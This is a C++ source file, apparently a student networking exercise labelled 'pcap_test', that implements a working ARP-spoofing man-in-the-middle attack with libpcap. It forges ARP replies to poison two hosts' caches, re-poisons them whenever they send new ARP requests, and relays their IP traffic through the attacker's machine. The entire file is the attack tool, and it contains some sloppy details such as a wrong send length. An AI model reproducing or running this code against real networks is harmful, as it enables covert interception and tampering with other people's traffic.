#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <time.h>
#include <string>

using namespace std;

typedef struct _ether_header{
    uint8_t dmac[6];
    uint8_t smac[6];
    uint16_t type;
}ether_header,*pether_header;

#pragma pack(1)
typedef struct _arp_header{
    uint16_t hd_type;
    uint16_t prot_type;
    uint8_t hd_size;
    uint8_t prot_size;
    uint16_t opcode;
    uint8_t s_mac[6];
    in_addr s_ip;
    uint8_t t_mac[6];
    in_addr t_ip;
}arp_header,*parp_header;

#pragma pack(1)
typedef struct _ipv4_header{
    uint8_t h_len:4;
    uint8_t ip_v:4;
    uint8_t tos;
    uint16_t ip_len;
    uint16_t iden;
    uint16_t flag;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    in_addr s_ip;
    in_addr d_ip;
}ipv4_header,*pipv4_header;

#define ETHERTYPE_ARP  0x0806
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_IP_V6 0x86dd
#define HDTYPE_ETH 0x0001
#define MAC_LEN 6
#define IP_LEN 4
#define OP_REQ 0x0001
#define OP_REP 0x0002

uint8_t broadcast[]={"\xff\xff\xff\xff\xff\xff"};

void print_mac(uint8_t *p_mac){
    for(int i=0 ; i<MAC_LEN ; i++){
        if(i==5){
            printf("%02x\n",p_mac[i]);
            break;
        }
        printf("%02x:",p_mac[i]);
    }
}

void make_my_mac(char* dev,uint8_t *a_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++)
            a_mac[i]=s.ifr_addr.sa_data[i];
    }
}

void make_my_ip (char * dev,in_addr *a_ip) {
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (0 == ioctl(sockfd, SIOCGIFADDR, &ifrq))  {
        //a_ip = a_ip-(char)1;
        sin = (struct sockaddr_in *)&ifrq.ifr_addr;
        memcpy (a_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
    }

}

void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: pcap_test wlan0\n");
}


u_char* send_check_packet(pcap_t* handle,char* dev,char* ip){
    uint8_t broadcast_packet[42];
    pether_header broad_eth=(pether_header)broadcast_packet;
    memcpy(broad_eth->dmac,broadcast,MAC_LEN);
    make_my_mac(dev,broad_eth->smac);
    broad_eth->type = htons(ETHERTYPE_ARP);

    parp_header broad_arp=(parp_header)(broadcast_packet+sizeof (ether_header));
    broad_arp->hd_type = htons(HDTYPE_ETH);
    broad_arp->prot_type = htons(ETHERTYPE_IP);
    broad_arp->hd_size = MAC_LEN;
    broad_arp->prot_size = IP_LEN;
    broad_arp->opcode = htons(OP_REQ);
    make_my_mac(dev,broad_arp->s_mac);
    make_my_ip(dev,&(broad_arp->s_ip));
    memset(broad_arp->t_mac,'\x00',MAC_LEN);
    inet_aton(ip,&(broad_arp->t_ip));

    uint8_t* r_pack= (uint8_t*)malloc(42);
    while(1){
        printf("check broadcast....\n");
        pcap_sendpacket(handle,broadcast_packet,PCAP_ERRBUF_SIZE);
        struct pcap_pkthdr* header;
        const u_char* c_packet;
        int res = pcap_next_ex(handle,&header,&c_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        pether_header eth = (pether_header)c_packet;
        uint16_t eth_type = ntohs(eth->type);
        if(eth_type == ETHERTYPE_ARP){
            parp_header arph = (parp_header)(c_packet+sizeof (ether_header));
            uint16_t op = htons(arph->opcode);
             if( (op == OP_REP ) && (broad_arp->t_ip.s_addr == arph->s_ip.s_addr) && (arph->t_ip.s_addr == broad_arp->s_ip.s_addr )){
                memcpy(r_pack,c_packet,42);
                return (u_char*)r_pack;
            }
        }
    }
}

u_char* make_arp_packet(char *dev ,pcap_t* handle ,u_char* packet ,char* sndr_ip ,char* trgt_ip){
    pether_header strd_eth_pack = (pether_header)packet;

    uint8_t* arp_packet = (uint8_t*)malloc(42);
    pether_header snd_arp_eth=(pether_header)arp_packet;
    memcpy(snd_arp_eth->dmac,strd_eth_pack->smac,MAC_LEN);
    make_my_mac(dev,snd_arp_eth->smac);
    snd_arp_eth->type = htons(ETHERTYPE_ARP);

    parp_header strd_arp_pack = (parp_header)(packet+sizeof (ether_header));

    parp_header snd_arp_arp = (parp_header)(arp_packet+sizeof (ether_header));
    snd_arp_arp->hd_type = htons(HDTYPE_ETH);
    snd_arp_arp->prot_type = htons(ETHERTYPE_IP);
    snd_arp_arp->hd_size = MAC_LEN;
    snd_arp_arp->prot_size = IP_LEN;
    snd_arp_arp->opcode = htons(OP_REP);
    make_my_mac(dev,snd_arp_arp->s_mac);
    inet_aton(trgt_ip,&(snd_arp_arp->s_ip));
    memcpy(snd_arp_arp->t_mac,strd_arp_pack->s_mac,MAC_LEN);
    inet_aton(sndr_ip,&(snd_arp_arp->t_ip));
    return (u_char*)arp_packet;
}


int main(int argc, char* argv[]) {
    char* dev = argv[1];
    char* sdr_ip = argv[2],* tgt_ip = argv[3];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    u_char* strd_s_packet,*strd_t_packet;
    u_char* sarp_s_packet,*sarp_t_packet;

    strd_s_packet=send_check_packet(handle,dev,sdr_ip);
    strd_t_packet=send_check_packet(handle,dev,tgt_ip);

    sarp_s_packet=make_arp_packet(dev,handle,strd_s_packet,sdr_ip,tgt_ip);
    sarp_t_packet=make_arp_packet(dev,handle,strd_t_packet,tgt_ip,sdr_ip);

    pcap_sendpacket(handle,sarp_s_packet,42);
    pcap_sendpacket(handle,sarp_s_packet,42);
    pcap_sendpacket(handle,sarp_s_packet,42);

    pcap_sendpacket(handle,sarp_t_packet,42);
    pcap_sendpacket(handle,sarp_t_packet,42);
    pcap_sendpacket(handle,sarp_t_packet,42);

    pether_header strd_s_eth = (pether_header)strd_s_packet;
    pether_header strd_t_eth = (pether_header)strd_t_packet;
    parp_header strd_s_arp = (parp_header)(strd_s_packet+sizeof (ether_header));
    parp_header strd_t_arp = (parp_header)(strd_t_packet+sizeof (ether_header));

    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res == 0) continue;
        if (res == -1 || res == -2) break;
        pether_header spf_eth = (pether_header)packet;
        uint16_t eth_type = ntohs(spf_eth->type);

        parp_header spf_arp = (parp_header)(packet+sizeof (ether_header));
        uint16_t op = htons(spf_arp->opcode);

        pipv4_header spf_ip = (pipv4_header)(packet+sizeof (ether_header));
        if( ( eth_type == ETHERTYPE_ARP ) && (op == OP_REQ ) ){
            if ( ( memcmp(spf_eth->smac,strd_s_eth->smac,MAC_LEN)==0 ) && ( memcmp(spf_eth->dmac,strd_s_eth->dmac,MAC_LEN)==0) && ( spf_arp->s_ip.s_addr == strd_s_arp->s_ip.s_addr ) && ( spf_arp->t_ip.s_addr == strd_t_arp->s_ip.s_addr )){
                pcap_sendpacket(handle,sarp_s_packet,42);
                pcap_sendpacket(handle,sarp_s_packet,42);
                print_mac(spf_eth->smac);
            }
            else if( ( memcmp(spf_eth->smac,strd_t_eth->smac,MAC_LEN)==0 ) && ( memcmp(spf_eth->dmac,strd_t_eth->dmac,MAC_LEN)==0) && ( spf_arp->s_ip.s_addr == strd_t_arp->s_ip.s_addr ) && ( spf_arp->t_ip.s_addr == strd_s_arp->s_ip.s_addr )){
                pcap_sendpacket(handle,sarp_t_packet,42);
                pcap_sendpacket(handle,sarp_t_packet,42);
                print_mac(spf_eth->smac);
            }
        }
        else if ( ( eth_type == ETHERTYPE_IP ) || ( eth_type == ETHERTYPE_IP_V6 )  ){
            if( ( memcmp(spf_eth->smac,strd_s_eth->smac,MAC_LEN) == 0 ) && ( memcmp(spf_eth->dmac,strd_s_eth->dmac,MAC_LEN) == 0 ) && (spf_ip->s_ip.s_addr == strd_s_arp->s_ip.s_addr) ){
                print_mac(spf_eth->smac);
                make_my_mac(dev,spf_eth->smac);
                memcpy(spf_eth->dmac,strd_t_eth->smac,MAC_LEN);
                pcap_sendpacket(handle,packet,int(header->len));
                printf(" S to T relay success \n");
            }
            else if( ( memcmp(spf_eth->smac,strd_t_eth->smac,MAC_LEN) == 0 ) && (memcmp(spf_eth->dmac,strd_t_eth->dmac,MAC_LEN)==0) && (spf_ip->d_ip.s_addr == strd_s_arp->s_ip.s_addr) ){
                print_mac(spf_eth->smac);
                make_my_mac(dev,spf_eth->smac);
                memcpy(spf_eth->dmac,strd_s_eth->smac,MAC_LEN);
                pcap_sendpacket(handle,packet,int(header->len));
                printf(" T to S relay success \n");
            }
        }
    }
    free(sarp_s_packet);
    free(strd_s_packet);
    free(strd_t_packet);
    free(sarp_t_packet);
    pcap_close(handle);
    return 0;
}
